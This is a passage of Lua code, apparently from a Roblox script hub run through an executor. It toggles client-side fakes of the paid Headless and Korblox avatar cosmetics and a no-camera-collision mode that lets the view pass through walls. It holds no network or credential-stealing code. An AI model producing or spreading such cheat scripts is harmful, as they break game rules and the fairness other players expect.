            local char = LP.Character
            if not char then return end
            local head = char:FindFirstChild("Head")
            if not head then return end
            local m = head:FindFirstChild("HeadlessMesh")
            if m then m:Destroy() end
            head.Transparency = 0
            head.CanCollide = true
        end)
        if _SV.setHeadlessVisual then _SV.setHeadlessVisual(false) end
    end
end -- fine do-block HEADLESS

do -- do-block KORBLOX
    local KORBLOX_MESH_ID    = "rbxassetid://101851696"
    local KORBLOX_TEXTURE_ID = "rbxassetid://101851254"
    local DARK_GREY_COLOR    = Color3.fromRGB(64, 64, 64)
    local _korbloxCharConn   = nil

    -- ── KORBLOX helpers ───────────────────────────────────────────
    local function _korbloxCleanConnections()
        for _, conn in ipairs(korbloxConnections) do
            pcall(function() conn:Disconnect() end)
        end
        korbloxConnections = {}
    end
    local function _applyKorbloxR6(character)
        local rightLeg = character:FindFirstChild("Right Leg")
        if not rightLeg then return end
        if rightLeg:FindFirstChild("KorbloxMesh") then return end
        for _, child in ipairs(rightLeg:GetChildren()) do
            if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then child:Destroy() end
        end
        rightLeg.Color = DARK_GREY_COLOR
        local colorConn = rightLeg:GetPropertyChangedSignal("Color"):Connect(function()
            if rightLeg.Color ~= DARK_GREY_COLOR then rightLeg.Color = DARK_GREY_COLOR end
        end)
        table.insert(korbloxConnections, colorConn)
        local korbloxMesh = Instance.new("SpecialMesh")
        korbloxMesh.Name = "KorbloxMesh"
        korbloxMesh.MeshType = Enum.MeshType.FileMesh
        korbloxMesh.MeshId = KORBLOX_MESH_ID
        korbloxMesh.TextureId = KORBLOX_TEXTURE_ID
        korbloxMesh.Scale = Vector3.new(1, 1, 1)
        korbloxMesh.Parent = rightLeg
    end
    local function _applyKorbloxR15(character)
        local rightUpperLeg = character:FindFirstChild("RightUpperLeg")
        if not rightUpperLeg then return end
        if character:FindFirstChild("KorbloxLeg") then return end
        rightUpperLeg.Transparency = 1
        local rightLowerLeg = character:FindFirstChild("RightLowerLeg")
        local rightFoot = character:FindFirstChild("RightFoot")
        if rightLowerLeg then rightLowerLeg.Transparency = 1 end
        if rightFoot then rightFoot.Transparency = 1 end
        local korbloxLeg = Instance.new("Part")
        korbloxLeg.Name = "KorbloxLeg"
        korbloxLeg.Size = Vector3.new(1, 2, 1)
        korbloxLeg.Anchored = false
        korbloxLeg.CanCollide = false
        korbloxLeg.Color = DARK_GREY_COLOR
        korbloxLeg.Parent = character
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = KORBLOX_MESH_ID
        mesh.TextureId = KORBLOX_TEXTURE_ID
        mesh.Scale = Vector3.new(1, 1, 1)
        mesh.Parent = korbloxLeg
        local weld = Instance.new("Weld")
        weld.Part0 = rightUpperLeg
        weld.Part1 = korbloxLeg
        weld.C0 = CFrame.new(0, -0.45, 0)
        weld.Parent = korbloxLeg
    end
    local function _applyKorbloxToCharacter(character)
        if not character then return end
        _korbloxCleanConnections()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        task.wait(0.1)
        if not korbloxEnabled then return end
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            _applyKorbloxR6(character)
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            _applyKorbloxR15(character)
        end
    end
    function enableKorblox()
        korbloxEnabled = true
        if _korbloxCharConn then pcall(function() _korbloxCharConn:Disconnect() end) end
        local char = LP.Character
        if char then _applyKorbloxToCharacter(char) end
        _korbloxCharConn = LP.CharacterAdded:Connect(function(char)
            _G._CalciumWaitCharReady(char, 10)
            if korbloxEnabled then _applyKorbloxToCharacter(char) end
        end)
        if _SV.setKorbloxVisual then _SV.setKorbloxVisual(true) end
    end
    function disableKorblox()
        korbloxEnabled = false
        _korbloxCleanConnections()
        if _korbloxCharConn then
            pcall(function() _korbloxCharConn:Disconnect() end)
            _korbloxCharConn = nil
        end
        -- Restore right leg
        pcall(function()
            local char = LP.Character
            if not char then return end
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                local m = rightLeg:FindFirstChild("KorbloxMesh")
                if m then m:Destroy() end
            end
            local korbloxLeg = char:FindFirstChild("KorbloxLeg")
            if korbloxLeg then korbloxLeg:Destroy() end
            local rul = char:FindFirstChild("RightUpperLeg")
            local rll = char:FindFirstChild("RightLowerLeg")
            local rf  = char:FindFirstChild("RightFoot")
            if rul then rul.Transparency = 0 end
            if rll then rll.Transparency = 0 end
            if rf  then rf.Transparency  = 0 end
        end)
        if _SV.setKorbloxVisual then _SV.setKorbloxVisual(false) end
    end
end -- fine do-block KORBLOX

do -- do-block VISUALS PAGE (continuazione dopo HEADLESS+KORBLOX)

  -- delegated to outer enableNoCamCollision / disableNoCamCollision (smooth zoom override)

  function enableCustomFont()
    customFontVisualEnabled = false
    if V then V.customFontEnabled = false end
  end
  function disableCustomFont()
    customFontVisualEnabled = false
    if V then V.customFontEnabled = false end
  end
end
V = V or {}
V.skyTheme = skyTheme or V.skyTheme or "Off"
V.customFontEnabled = false
V.potatoGraphicsEnabled = V.potatoGraphicsEnabled or false

_G._CalciumNC = _G._CalciumNC or {targetZoom=10, currentZoom=10, zoomConn=nil, watchConns={}, resync=true}

function enableNoCamCollision()
  noCamCollisionEnabled = true
  local NC = _G._CalciumNC
  local cam0 = workspace.CurrentCamera
  NC.targetZoom  = math.clamp(10, LP.CameraMinZoomDistance, LP.CameraMaxZoomDistance)
  NC.currentZoom = NC.targetZoom
  NC.resync = true   -- al primo frame utile si riallinea alla camera vera

  if NC.zoomConn then NC.zoomConn:Disconnect() end
  NC.zoomConn = UserInputService.InputChanged:Connect(function(input, gameProcessed)
    if not noCamCollisionEnabled then return end
    if gameProcessed then return end
    if input.UserInputType == Enum.UserInputType.MouseWheel then
      local curMin = LP.CameraMinZoomDistance
      local curMax = LP.CameraMaxZoomDistance
      NC.targetZoom = math.clamp(NC.targetZoom - (input.Position.Z * 4), curMin, curMax)
    end
  end)

  -- WATCHER: se il gioco cambia la camera da solo (limiti di zoom, prima
  -- persona forzata, cambio di camera al respawn) si chiede un riallineamento
  -- invece di continuare a imporre il nostro zoom.
  for _, c in ipairs(NC.watchConns or {}) do pcall(function() c:Disconnect() end) end
  NC.watchConns = {}
  local function askResync() NC.resync = true end
  table.insert(NC.watchConns, LP:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(askResync))
  table.insert(NC.watchConns, LP:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(askResync))
  table.insert(NC.watchConns, workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(askResync))
  table.insert(NC.watchConns, LP.CharacterAdded:Connect(askResync))
  if cam0 then
    table.insert(NC.watchConns, cam0:GetPropertyChangedSignal("CameraType"):Connect(askResync))
    table.insert(NC.watchConns, cam0:GetPropertyChangedSignal("CameraSubject"):Connect(askResync))
  end
  pcall(function() RunService:UnbindFromRenderStep("CalciumNoCamCollision") end)
  RunService:BindToRenderStep("CalciumNoCamCollision", Enum.RenderPriority.Camera.Value + 1, function(deltaTime)
    if not noCamCollisionEnabled then return end

    -- la camera si rilegge ogni frame: dopo un respawn quella vecchia e' morta
    local cam = workspace.CurrentCamera
    if not cam then return end
    if cam.CameraType == Enum.CameraType.Scriptable then NC.resync = true return end
    if cam.CameraSubject == nil then NC.resync = true return end

    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then NC.resync = true return end

    local curMin = LP.CameraMinZoomDistance
    local curMax = LP.CameraMaxZoomDistance

    -- il gioco sta forzando la prima persona: non si scrive nulla, altrimenti
    -- si resta incastrati in prima persona anche dopo che la rilascia
    if curMax <= 1 then
      NC.resync = true
      return
    end
    local realZoom = (cam.CFrame.Position - cam.Focus.Position).Magnitude

    if realZoom < 0.6 then
      -- prima persona non decisa da noi: ci si adegua e si aspetta
      NC.resync = true
      return
    end
    -- Riallineamento: al primo frame buono dopo un cambio del gioco, oppure
    -- se la camera si e' allontanata piu' di quanto avessimo imposto noi
    -- (solo il gioco puo' farlo: la collisione avvicina, non allontana).
    if NC.resync or realZoom > NC.currentZoom + 0.5 then
      NC.targetZoom  = math.clamp(realZoom, curMin, curMax)
      NC.currentZoom = NC.targetZoom
      NC.resync = false
    end
    NC.targetZoom  = math.clamp(NC.targetZoom, curMin, curMax)
    NC.currentZoom = NC.currentZoom + (NC.targetZoom - NC.currentZoom) * math.min(deltaTime * 15, 1)
    cam.CFrame = cam.Focus * cam.CFrame.Rotation * CFrame.new(0, 0, NC.currentZoom)
  end)
end
function disableNoCamCollision()
  noCamCollisionEnabled = false
  pcall(function() RunService:UnbindFromRenderStep("CalciumNoCamCollision") end)
  if _G._CalciumNC.zoomConn then _G._CalciumNC.zoomConn:Disconnect(); _G._CalciumNC.zoomConn = nil end
  for _, c in ipairs(_G._CalciumNC.watchConns or {}) do pcall(function() c:Disconnect() end) end
  _G._CalciumNC.watchConns = {}
  noCamCollisionParts = {}
end
